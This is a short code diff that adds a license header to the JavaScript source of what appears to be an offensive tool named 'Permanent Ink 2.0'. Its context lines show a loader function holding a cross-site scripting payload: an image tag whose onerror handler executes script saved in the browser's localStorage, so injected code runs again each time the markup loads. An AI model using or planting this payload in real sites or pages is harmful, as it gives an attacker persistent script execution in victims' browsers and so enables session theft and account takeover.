@@ -1,3 +1,9 @@
+// Permanent Ink 2.0
+
+// © 2023 redbigz.github.io
+// http://creativecommons.org/licenses/by-nd/4.0/
+// This work is licensed under a Creative Commons Attribution-NoDerivatives 4.0 International License.
+
 const _pi2_loader_func = () => {
     let XSS = "<img src=//0.0.0.0 onerror='new Function(localStorage.PILoader).call(this)'>";
 
